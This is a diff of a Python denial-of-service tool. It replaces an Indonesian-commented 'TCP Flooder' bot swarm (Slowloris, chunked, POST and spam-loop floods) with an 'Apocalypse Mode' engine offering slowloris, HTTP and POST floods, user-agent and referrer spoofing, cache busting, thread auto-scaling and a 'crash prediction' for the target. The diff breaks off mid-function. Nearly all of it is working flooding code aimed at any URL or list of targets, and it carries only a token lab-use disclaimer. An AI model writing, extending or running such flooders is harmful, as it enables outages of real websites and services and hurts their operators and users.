@@ -1,629 +1,959 @@
-# TCP Flooder Lab Test - v4.0 EPIC HACKER EDITION + Bot Swarm + SPAMMER BOT
-# ⚠️ DISCLAIMER: Gunakan hanya di lab/test server yang kamu kontrol sendiri
-# 🔥 Ultimate Visual + 8 Bots + Spammer with Loop
-
-import socket, random, threading, time, os, sys, json, ssl, zlib
-import urllib.parse
-from datetime import datetime
-import urllib.request
-
-useragents = [
-    "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
-    "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
-    "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
-    "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
-    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
-    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0",
-    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
-    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
-    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
-    "Mozilla/5.0 (Windows; U;; en-NZ) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
-    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
-    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
-]
-
-ref = [
-    'http://www.bing.com/search?q=',
-    'https://www.yandex.com/yandsearch?text=',
-    'https://duckduckgo.com/?q='
-]
-
-acceptall = [
-    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
-    "Accept-Encoding: gzip, deflate\r\n",
-    "Accept-Language: en-US,en;q=0.5\r\n"
-]
-
-# Definisi warna EPIC Cyberpunk Hacker Aesthetic
-G = "\033[92m"   # Green Matrix
-C = "\033[96m"   # Cyan Electric
-O = "\033[38;5;208m"  # Orange
-M = "\033[91m"   # Red Alert
-K = "\033[93m"   # Yellow Warning
-P = "\033[95m"   # Purple/Magenta
-A = "\033[90m"   # Gray Shadow
-W = "\033[97m"   # White Bright
-B = "\033[1m"    # Bold
-DIM = "\033[2m"  # Dim
-U = "\033[4m"    # Underline
-R = "\033[0m"    # Reset
-BG_R = "\033[41m" # Background Red
-BG_G = "\033[42m" # Background Green
-
-def clear_screen():
-    os.system("clear" if os.name != "nt" else "cls")
-
-def print_slowly(text, delay=0.01):
-    """Animasi print character by character"""
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
-
-def print_border(char="═", length=80, color=C):
-    """Print border dengan warna"""
-    print(f"{color}{char * length}{R}")
-
-def print_box(text, width=80, color=G):
-    """Print text dalam box"""
-    padding = width - len(text) - 4
-    left_pad = padding // 2
-    right_pad = padding - left_pad
-    print(f"{color}║{R} {' ' * left_pad}{B}{text}{R}{' ' * right_pad} {color}║{R}")
-
-def get_public_ip():
-    """Deteksi IP public (support Tor/Proxychains)"""
-    ip_services = [
-        'https://api.ipify.org',
-        'https://icanhazip.com',
-        'https://ifconfig.me/ip',
-        'https://ipinfo.io/ip',
-        'http://checkip.amazonaws.com'
-    ]
-    
-    for service in ip_services:
-        try:
-            req = urllib.request.Request(service, headers={'User-Agent': random.choice(useragents)})
-            with urllib.request.urlopen(req, timeout=5) as response:
-                ip = response.read().decode('utf-8').strip()
-                return ip
-        except:
-            continue
-    
-    return "Unable to detect"
-
-clear_screen()
-
-# ===================== EPIC LOGO CYBERPUNK EDITION =====================
-print_border("╔", 80, P)
-print(f"""{P}╔══════════════════════════════════════════════════════════════════════════════╗{R}""")
-
-art_epic = f"""
-{K}    ███████╗██╗      ██████╗  ██████╗ ██████╗     ██████╗  ██████╗ ████████╗{R}
-{K}    ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗    ██╔══██╗██╔═══██╗╚══██╔══╝{R}
-{O}    █████╗  ██║     ██║   ██║██║   ██║██║  ██║    ██████╔╝██║   ██║   ██║   {R}
-{O}    ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║    ██╔══██╗██║   ██║   ██║   {R}
-{M}    ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝    ██████╔╝╚██████╔╝   ██║   {R}
-{M}    ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝     ╚═════╝  ╚═════╝    ╚═╝   {R}
+#!/usr/bin/env python3
 """
-print(art_epic)
+BRUTAL WEB STRESS TESTER - APOCALYPSE MODE v3.5
+Ultimate web stress testing tool with maximum capabilities
+Author: dANZ Cyber Team
+Version: 3.5 Apocalypse Edition
+"""
 
-print(f"{P}╠══════════════════════════════════════════════════════════════════════════════╣{R}")
-print_box(f"{G}█▓▒░ HYBRID FLOOD PROTOCOL v4.0 EPIC EDITION ░▒▓█{R}", 80, P)
-print_box(f"{C}SYSTEM INITIALIZED - 8 BOTS READY - SPAMMER ACTIVE{R}", 80, P)
-print(f"{P}╠══════════════════════════════════════════════════════════════════════════════╣{R}")
+import requests
+import time
+import random
+import string
+import json
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from threading import Lock, Event
+from collections import deque
+import socket
+import urllib3
+from urllib.parse import urlparse, urlencode
 
-bot_list = [
-    f"{G}[BOT-01]{R} {C}Alpha{R}     {DIM}→ GET burst attack{R}                              ",
-    f"{G}[BOT-02]{R} {C}Bravo{R}     {DIM}→ POST JSON payload{R}                             ",
-    f"{G}[BOT-03]{R} {C}Charlie{R}   {DIM}→ HEAD/OPTIONS fuzzing{R}                          ",
-    f"{G}[BOT-04]{R} {C}Delta{R}     {DIM}→ Slowloris connection{R}                          ",
-    f"{G}[BOT-05]{R} {C}Echo{R}      {DIM}→ Chunked encoding{R}                              ",
-    f"{G}[BOT-06]{R} {C}Foxtrot{R}   {DIM}→ Compressed payload{R}                            ",
-    f"{G}[BOT-07]{R} {C}Gamma{R}     {DIM}→ TRACE/PUT methods{R}                             ",
-    f"{M}[BOT-08]{R} {M}{B}Spammer{R}   {DIM}→ {M}HTTP spam attack (1-4000 loop){R}                "
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.live import Live
+from rich.layout import Layout
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
+from rich import box
+from rich.text import Text
+from rich.columns import Columns
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+console = Console()
+
+# Thread-safe locks
+print_lock = Lock()
+stats_lock = Lock()
+
+# Global control
+stop_event = Event()
+
+BANNER = """
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║    █████╗ ██████╗  ██████╗  ██████╗ █████╗ ██╗  ██╗   ██╗██████╗ ███████╗║
+║   ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗██║  ╚██╗ ██╔╝██╔══██╗██╔════╝║
+║   ███████║██████╔╝██║   ██║██║     ███████║██║   ╚████╔╝ ██████╔╝███████╗║
+║   ██╔══██║██╔═══╝ ██║   ██║██║     ██╔══██║██║    ╚██╔╝  ██╔═══╝ ╚════██║║
+║   ██║  ██║██║     ╚██████╔╝╚██████╗██║  ██║███████╗██║   ██║     ███████║║
+║   ╚═╝  ╚═╝╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝     ╚══════╝║
+║                                                                           ║
+║              [ Ultimate Stress Testing Framework v3.5 ]                  ║
+║                  [ APOCALYPSE MODE - Maximum Power ]                     ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+"""
+
+# User Agent Pool
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
+    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
 ]
 
-for bot in bot_list:
-    print(f"{P}║{R} {bot.ljust(88)} {P}║{R}")
+# Referrer Pool
+REFERRERS = [
+    'https://www.google.com/',
+    'https://www.bing.com/',
+    'https://www.yahoo.com/',
+    'https://www.facebook.com/',
+    'https://www.twitter.com/',
+    'https://www.reddit.com/',
+    'https://www.linkedin.com/',
+    'https://www.instagram.com/',
+]
 
-print(f"{P}╠══════════════════════════════════════════════════════════════════════════════╣{R}")
-print_box(f"{K}⚠️  WARNING: USE ONLY ON YOUR OWN LAB/TEST SERVERS ⚠️{R}", 80, P)
-print(f"{P}╚══════════════════════════════════════════════════════════════════════════════╝{R}")
-print()
 
-# ===================== USER INPUT SECTION =====================
-print_border("─", 80, C)
-print(f"{B}{G}[CONFIGURATION PANEL]{R}")
-print_border("─", 80, C)
+class AttackMode:
+    """Attack mode definitions"""
+    NORMAL = "normal"
+    SLOWLORIS = "slowloris"
+    HTTP_FLOOD = "http_flood"
+    POST_FLOOD = "post_flood"
+    CACHE_BUSTER = "cache_buster"
+    RAMP_UP = "ramp_up"
+    BURST = "burst"
+    STEALTH = "stealth"
 
-url_input = str(input(f'{G}[+]{R} Target URL/IP {DIM}(https://... or url.txt/ip.txt){R}: '))
-pack = int(input(f'{G}[+]{R} Packet/s {DIM}(how many packets per connection){R}: '))
-thread_count = int(input(f'{G}[+]{R} Threads {DIM}(concurrent bots){R}: '))
 
-# ===================== SPAMMER BOT CONFIGURATION =====================
-print()
-print_border("─", 80, M)
-print(f"{B}{M}[SPAMMER BOT CONFIGURATION]{R}")
-print_border("─", 80, M)
-print(f"{M}Bot Spammer{R} akan membuka URL target secara berulang dengan loop 1-4000")
-
-enable_spammer = str(input(f'{M}[?]{R} Aktifkan Bot Spammer? {C}(y/n){R}: ')).lower()
-spammer_iterations = 0
-
-if enable_spammer == 'y':
-    while True:
-        try:
-            spam_choice = int(input(f'{M}[+]{R} Pilih spam count {DIM}(1-4000){R}: '))
-            if 1 <= spam_choice <= 4000:
-                spammer_iterations = spam_choice
-                print(f"{G}[✓]{R} Bot Spammer aktif dengan {M}{spam_choice}{R} iterations dalam loop!")
-                break
-            else:
-                print(f"{M}[!]{R} Nilai harus antara 1-4000!")
-        except ValueError:
-            print(f"{M}[!]{R} Input tidak valid!")
-else:
-    print(f"{K}[!]{R} Bot Spammer dinonaktifkan")
-
-print_border("─", 80, C)
-print()
-
-# Load multi-target dari file
-targets = []
-if url_input.endswith(".txt"):
-    try:
-        with open(url_input,"r") as f:
-            for line in f:
-                line=line.strip()
-                if not line: continue
-                if line.startswith("http://") or line.startswith("https://"):
-                    targets.append(line)
-                else:
-                    targets.append(f"ip://{line}")
-        print(f"{G}[✓]{R} Loaded {len(targets)} targets from file")
-    except Exception as e:
-        print(f"{M}[✗]{R} Error membaca file: {e}")
-        sys.exit(1)
-else:
-    if url_input.startswith("http://") or url_input.startswith("https://"):
-        targets = [url_input]
-    else:
-        targets = [f"ip://{url_input}"]
-
-# ===================== STATISTICS INITIALIZATION =====================
-stats_global = {"sent":0,"hits":0,"fail":0,"error":0}
-stats_bot = {}
-stats_target = {t:{"sent":0,"hits":0,"fail":0,"error":0,"monitor":"UNKNOWN"} for t in targets}
-
-bots = {
-    "Alpha":"GET burst",
-    "Bravo":"POST JSON",
-    "Charlie":"HEAD/OPTIONS",
-    "Delta":"Slowloris",
-    "Echo":"Chunked",
-    "Foxtrot":"Compressed",
-    "Gamma":"TRACE/PUT",
-    "Spammer":"HTTP Spam Loop"
-}
-
-# Inisialisasi semua bot
-for bot in bots.keys():
-    stats_bot[bot] = {"sent":0,"hits":0,"fail":0,"error":0}
-
-# ===================== HELPER FUNCTIONS =====================
-def rand_string(n=None):
-    length = n if n else random.randint(5,200)
-    return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789",k=length))
-
-def generate_headers(botname,target):
-    headers = [
-        "User-Agent: " + random.choice(useragents),
-        "Referer: " + random.choice(ref) + target,
-        "X-Bot-ID: " + botname,
-        "X-Bot-Mode: " + bots[botname],
-        "X-Custom-Payload: " + rand_string(),
-        random.choice(acceptall)
-    ]
-    random.shuffle(headers)
-    return "\r\n".join(headers) + "\r\n"
-
-def generate_body_json():
-    body = {"id":rand_string(6),"msg":rand_string(random.randint(5,20)),"flag":random.choice([True,False])}
-    return json.dumps(body)
-
-def generate_chunked_body():
-    chunks=[]
-    for _ in range(random.randint(2,5)):
-        data=rand_string(random.randint(5,30))
-        chunks.append(f"{len(data):X}\r\n{data}\r\n")
-    chunks.append("0\r\n\r\n")
-    return "".join(chunks)
-
-def compressed_body():
-    data=rand_string(200)
-    return zlib.compress(data.encode())
-
-def build_request(method,botname,host,path,target):
-    headers=generate_headers(botname,target)
-    if method=="GET":
-        request_line=f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"; body=""
-    elif method=="POST":
-        request_line=f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"; body=generate_body_json()
-    elif method=="CHUNKED":
-        request_line=f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n"; body=generate_chunked_body()
-    elif method=="COMPRESS":
-        request_line=f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
-        body=compressed_body().decode('latin1','ignore'); headers+="Accept-Encoding: gzip\r\n"
-    else: # HEAD/OPTIONS/TRACE/PUT
-        request_line=f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"; body=""
-    length=f"Content-Length: {len(body)}\r\nConnection: Keep-Alive\r\n"
-    return request_line+headers+length+"\r\n"+body
-
-# ===================== BOT SPAMMER FUNCTION =====================
-def spammer_bot():
-    """Bot khusus untuk spam buka web dengan loop"""
-    global stats_global, stats_bot, stats_target
+class ApocalypseEngine:
+    """Ultimate stress testing engine with maximum capabilities"""
     
-    loop_count = 0
-    while True:
-        for iteration in range(spammer_iterations):
-            target = random.choice(targets)
+    def __init__(self, targets, total_requests, threads, delay=0, attack_mode=AttackMode.NORMAL):
+        self.targets = targets if isinstance(targets, list) else [targets]
+        self.total_requests = total_requests
+        self.threads = threads
+        self.delay = delay
+        self.attack_mode = attack_mode
+        
+        # Statistics per target
+        self.stats = {target: {
+            'success': 0,
+            'failed': 0,
+            'bytes': 0,
+            'response_times': deque(maxlen=100),
+            'status_codes': {},
+            'completed': 0
+        } for target in self.targets}
+        
+        # Global stats
+        self.total_success = 0
+        self.total_failed = 0
+        self.total_bytes = 0
+        self.total_completed = 0
+        
+        # Timing
+        self.start_time = None
+        self.end_time = None
+        
+        # Attack features
+        self.use_proxy_rotation = False
+        self.proxy_list = []
+        self.use_user_agent_rotation = True
+        self.use_cache_buster = False
+        self.use_referrer_spoofing = True
+        
+        # Auto-scale settings
+        self.auto_scale = False
+        self.current_threads = threads
+        self.max_threads = 500
+        
+        # AI Predictor
+        self.failure_rate_history = deque(maxlen=20)
+        self.predicted_crash_time = None
+        
+        # Weak point detection
+        self.endpoint_performance = {}
+        
+        # Control
+        self.running = True
+        
+    def generate_random_string(self, length=10):
+        """Generate random string for cache busting"""
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+    
+    def get_random_user_agent(self):
+        """Get random user agent"""
+        return random.choice(USER_AGENTS)
+    
+    def get_random_referrer(self):
+        """Get random referrer"""
+        return random.choice(REFERRERS)
+    
+    def get_cache_buster_params(self):
+        """Generate cache buster parameters"""
+        return {
+            '_': str(int(time.time() * 1000)),
+            'r': self.generate_random_string(8),
+            'cache': 'false',
+            'nocache': self.generate_random_string(6)
+        }
+    
+    def build_headers(self):
+        """Build request headers with rotation"""
+        headers = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+        }
+        
+        if self.use_user_agent_rotation:
+            headers['User-Agent'] = self.get_random_user_agent()
+        
+        if self.use_referrer_spoofing:
+            headers['Referer'] = self.get_random_referrer()
+        
+        return headers
+    
+    def build_url(self, base_url):
+        """Build URL with cache buster if enabled"""
+        if not self.use_cache_buster:
+            return base_url
+        
+        parsed = urlparse(base_url)
+        params = self.get_cache_buster_params()
+        
+        if parsed.query:
+            return f"{base_url}&{urlencode(params)}"
+        else:
+            return f"{base_url}?{urlencode(params)}"
+    
+    def predict_crash(self):
+        """AI-powered crash prediction"""
+        if len(self.failure_rate_history) < 10:
+            return None
+        
+        recent_failures = list(self.failure_rate_history)[-10:]
+        avg_failure_rate = sum(recent_failures) / len(recent_failures)
+        
+        if avg_failure_rate > 0.5:
+            # High failure rate, predict crash
+            elapsed = time.time() - self.start_time
+            rps = self.total_completed / elapsed if elapsed > 0 else 0
             
-            if target.startswith("ip://"):
-                host = target.replace("ip://","")
-                path = "/"
-                tport = 80
+            if rps > 0:
+                remaining_capacity = (1 - avg_failure_rate) * 100
+                predicted_time = elapsed + (remaining_capacity / rps)
+                return predicted_time
+        
+        return None
+    
+    def update_failure_rate(self):
+        """Update failure rate for AI prediction"""
+        if self.total_completed > 0:
+            failure_rate = self.total_failed / self.total_completed
+            self.failure_rate_history.append(failure_rate)
+            
+            # Update prediction
+            self.predicted_crash_time = self.predict_crash()
+    
+    def auto_scale_threads(self):
+        """Auto-scale threads based on performance"""
+        if not self.auto_scale:
+            return
+        
+        if self.total_completed < 100:
+            return
+        
+        elapsed = time.time() - self.start_time
+        rps = self.total_completed / elapsed if elapsed > 0 else 0
+        success_rate = self.total_success / self.total_completed if self.total_completed > 0 else 0
+        
+        # If success rate is high and RPS is good, scale up
+        if success_rate > 0.95 and rps > 100 and self.current_threads < self.max_threads:
+            self.current_threads = min(self.current_threads + 10, self.max_threads)
+            console.log(f"[+] Auto-scaling: Increased threads to {self.current_threads}")
+        
+        # If success rate is low, scale down
+        elif success_rate < 0.8 and self.current_threads > 10:
+            self.current_threads = max(self.current_threads - 10, 10)
+            console.log(f"[+] Auto-scaling: Decreased threads to {self.current_threads}")
+    
+    def slowloris_attack(self, target, request_id):
+        """Slowloris attack - keep connections alive"""
+        try:
+            parsed = urlparse(target)
+            host = parsed.netloc
+            port = 443 if parsed.scheme == 'https' else 80
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            
+            if parsed.scheme == 'https':
+                import ssl
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                sock = context.wrap_socket(sock, server_hostname=host)
+            
+            sock.connect((host, port))
+            
+            # Send partial HTTP request
+            sock.send(f"GET {parsed.path or '/'} HTTP/1.1\r\n".encode())
+            sock.send(f"Host: {host}\r\n".encode())
+            sock.send(f"User-Agent: {self.get_random_user_agent()}\r\n".encode())
+            
+            # Keep connection alive by sending headers slowly
+            for _ in range(10):
+                if not self.running:
+                    break
+                sock.send(f"X-{self.generate_random_string(5)}: {self.generate_random_string(10)}\r\n".encode())
+                time.sleep(1)
+            
+            sock.close()
+            return True
+            
+        except Exception as e:
+            return False
+    
+    def http_flood(self, target, request_id):
+        """Rapid HTTP flood with random headers"""
+        try:
+            headers = self.build_headers()
+            
+            # Add random headers
+            for _ in range(5):
+                key = f"X-{self.generate_random_string(8)}"
+                value = self.generate_random_string(16)
+                headers[key] = value
+            
+            url = self.build_url(target)
+            
+            start = time.time()
+            response = requests.get(
+                url,
+                headers=headers,
+                timeout=5,
+                verify=False,
+                allow_redirects=True
+            )
+            response_time = time.time() - start
+            
+            return self.process_response(target, response, response_time)
+            
+        except Exception as e:
+            return self.process_error(target, e)
+    
+    def post_flood(self, target, request_id):
+        """POST flood with random payload"""
+        try:
+            headers = self.build_headers()
+            headers['Content-Type'] = 'application/x-www-form-urlencoded'
+            
+            # Generate random POST data
+            payload = {
+                self.generate_random_string(8): self.generate_random_string(100)
+                for _ in range(10)
+            }
+            
+            url = self.build_url(target)
+            
+            start = time.time()
+            response = requests.post(
+                url,
+                headers=headers,
+                data=payload,
+                timeout=5,
+                verify=False,
+                allow_redirects=True
+            )
+            response_time = time.time() - start
+            
+            return self.process_response(target, response, response_time)
+            
+        except Exception as e:
+            return self.process_error(target, e)
+    
+    def normal_attack(self, target, request_id):
+        """Normal HTTP GET request"""
+        try:
+            headers = self.build_headers()
+            url = self.build_url(target)
+            
+            start = time.time()
+            response = requests.get(
+                url,
+                headers=headers,
+                timeout=10,
+                verify=False,
+                allow_redirects=True
+            )
+            response_time = time.time() - start
+            
+            return self.process_response(target, response, response_time)
+            
+        except Exception as e:
+            return self.process_error(target, e)
+    
+    def process_response(self, target, response, response_time):
+        """Process successful response"""
+        with stats_lock:
+            self.stats[target]['completed'] += 1
+            self.stats[target]['response_times'].append(response_time)
+            self.total_completed += 1
+            
+            status_code = response.status_code
+            
+            if status_code not in self.stats[target]['status_codes']:
+                self.stats[target]['status_codes'][status_code] = 0
+            self.stats[target]['status_codes'][status_code] += 1
+            
+            if status_code == 200:
+                self.stats[target]['success'] += 1
+                self.stats[target]['bytes'] += len(response.content)
+                self.total_success += 1
+                self.total_bytes += len(response.content)
             else:
-                parsed = urllib.parse.urlparse(target)
-                host = parsed.netloc if parsed.netloc else "127.0.0.1"
-                path = parsed.path if parsed.path else "/"
-                tport = 443 if parsed.scheme=="https" else 80
+                self.stats[target]['failed'] += 1
+                self.total_failed += 1
+            
+            # Update AI prediction
+            self.update_failure_rate()
+        
+        return True
+    
+    def process_error(self, target, error):
+        """Process error response"""
+        with stats_lock:
+            self.stats[target]['failed'] += 1
+            self.stats[target]['completed'] += 1
+            self.total_failed += 1
+            self.total_completed += 1
+            
+            error_key = f"ERROR: {type(error).__name__}"
+            if error_key not in self.stats[target]['status_codes']:
+                self.stats[target]['status_codes'][error_key] = 0
+            self.stats[target]['status_codes'][error_key] += 1
+            
+            # Update AI prediction
+            self.update_failure_rate()
+        
+        return False
+    
+    def execute_request(self, request_id):
+        """Execute single request based on attack mode"""
+        if not self.running:
+            return False
+        
+        # Select random target
+        target = random.choice(self.targets)
+        
+        try:
+            # Execute based on attack mode
+            if self.attack_mode == AttackMode.SLOWLORIS:
+                result = self.slowloris_attack(target, request_id)
+            elif self.attack_mode == AttackMode.HTTP_FLOOD:
+                result = self.http_flood(target, request_id)
+            elif self.attack_mode == AttackMode.POST_FLOOD:
+                result = self.post_flood(target, request_id)
+            else:
+                result = self.normal_attack(target, request_id)
+            
+            # Apply delay
+            if self.delay > 0:
+                time.sleep(self.delay)
+            
+            # Auto-scale check
+            if request_id % 100 == 0:
+                self.auto_scale_threads()
+            
+            return result
+            
+        except Exception as e:
+            return self.process_error(target, e)
+    
+    def create_live_dashboard(self):
+        """Create comprehensive live dashboard"""
+        elapsed = time.time() - self.start_time if self.start_time else 0
+        rps = self.total_completed / elapsed if elapsed > 0 else 0
+        success_rate = (self.total_success / self.total_completed * 100) if self.total_completed > 0 else 0
+        bandwidth = (self.total_bytes / elapsed / 1024 / 1024) if elapsed > 0 else 0
+        
+        # Main stats table
+        stats_table = Table(show_header=True, box=box.ROUNDED, border_style="cyan")
+        stats_table.add_column("Metric", style="yellow bold", width=25)
+        stats_table.add_column("Value", style="white", width=20)
+        stats_table.add_column("Status", style="cyan", width=20)
+        
+        # Progress
+        progress_percent = (self.total_completed / self.total_requests * 100) if self.total_requests > 0 else 0
+        progress_color = "green" if progress_percent > 70 else "yellow" if progress_percent > 30 else "red"
+        
+        stats_table.add_row(
+            "[+] Progress",
+            f"{self.total_completed}/{self.total_requests}",
+            f"[{progress_color}]{progress_percent:.1f}%[/{progress_color}]"
+        )
+        
+        # Success rate
+        success_color = "green" if success_rate > 90 else "yellow" if success_rate > 70 else "red"
+        stats_table.add_row(
+            "[+] Success Rate",
+            f"{self.total_success} / {self.total_failed}",
+            f"[{success_color}]{success_rate:.1f}%[/{success_color}]"
+        )
+        
+        # RPS
+        rps_color = "green" if rps > 100 else "yellow" if rps > 50 else "white"
+        rps_status = "EXTREME" if rps > 200 else "HIGH" if rps > 100 else "MEDIUM" if rps > 50 else "LOW"
+        stats_table.add_row(
+            "[+] Requests/Sec",
+            f"[{rps_color}]{rps:.2f}[/{rps_color}]",
+            f"[{rps_color}]{rps_status}[/{rps_color}]"
+        )
+        
+        # Response time
+        all_response_times = []
+        for target_stats in self.stats.values():
+            all_response_times.extend(list(target_stats['response_times']))
+        
+        avg_response = (sum(all_response_times) / len(all_response_times)) if all_response_times else 0
+        resp_status = "FAST" if avg_response < 1 else "NORMAL" if avg_response < 3 else "SLOW"
+        stats_table.add_row(
+            "[+] Avg Response",
+            f"{avg_response*1000:.0f}ms",
+            resp_status
+        )
+        
+        # Bandwidth
+        stats_table.add_row(
+            "[+] Bandwidth",
+            f"{self.total_bytes/1024/1024:.2f} MB",
+            f"{bandwidth:.2f} MB/s"
+        )
+        
+        # Threads
+        stats_table.add_row(
+            "[+] Active Threads",
+            str(self.current_threads),
+            "Auto-Scaling" if self.auto_scale else "Fixed"
+        )
+        
+        # AI Prediction
+        if self.predicted_crash_time:
+            time_to_crash = self.predicted_crash_time - elapsed
+            pred_color = "red" if time_to_crash < 30 else "yellow" if time_to_crash < 60 else "green"
+            stats_table.add_row(
+                "[!] AI Prediction",
+                f"[{pred_color}]Crash in ~{time_to_crash:.0f}s[/{pred_color}]",
+                "[red]WARNING[/red]"
+            )
+        
+        return Panel(
+            stats_table,
+            title="[bold magenta][*] Live Attack Statistics[/bold magenta]",
+            border_style="magenta",
+            box=box.DOUBLE
+        )
+    
+    def create_targets_panel(self):
+        """Create targets status panel"""
+        if len(self.targets) == 1:
+            return None
+        
+        targets_table = Table(show_header=True, box=box.SIMPLE)
+        targets_table.add_column("Target", style="cyan", width=40)
+        targets_table.add_column("Success", style="green", width=10, justify="right")
+        targets_table.add_column("Failed", style="red", width=10, justify="right")
+        targets_table.add_column("Rate", style="yellow", width=10, justify="right")
+        
+        for target, stats in self.stats.items():
+            completed = stats['completed']
+            success = stats['success']
+            failed = stats['failed']
+            rate = (success / completed * 100) if completed > 0 else 0
+            
+            # Truncate long URLs
+            display_target = target if len(target) <= 40 else target[:37] + "..."
+            
+            targets_table.add_row(
+                display_target,
+                str(success),
+                str(failed),
+                f"{rate:.1f}%"
+            )
+        
+        return Panel(
+            targets_table,
+            title="[bold yellow][*] Multi-Target Status[/bold yellow]",
+            border_style="yellow"
+        )
+    
+    def run_attack(self):
+        """Execute the attack"""
+        self.start_time = time.time()
+        
+        console.log("[+] Attack engine initialized")
+        console.log(f"[+] Attack mode: {self.attack_mode.upper()}")
+        console.log(f"[+] Targets: {len(self.targets)}")
+        console.log(f"[+] Total requests: {self.total_requests:,}")
+        console.log(f"[+] Initial threads: {self.threads}")
+        console.log(f"[+] User-Agent rotation: {'ENABLED' if self.use_user_agent_rotation else 'DISABLED'}")
+        console.log(f"[+] Cache buster: {'ENABLED' if self.use_cache_buster else 'DISABLED'}")
+        console.log(f"[+] Auto-scale: {'ENABLED' if self.auto_scale else 'DISABLED'}")
+        
+        time.sleep(2)
+        
+        # Progress bar
+        progress = Progress(
+            SpinnerColumn(),
+            TextColumn("[bold blue]{task.description}"),
+            BarColumn(bar_width=40),
+            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+            TextColumn("•"),
+            TimeRemainingColumn(),
+            console=console
+        )
+        
+        # Layout
+        layout = Layout()
+        layout.split_column(
+            Layout(name="header", size=3),
+            Layout(name="main"),
+            Layout(name="progress", size=3)
+        )
+        
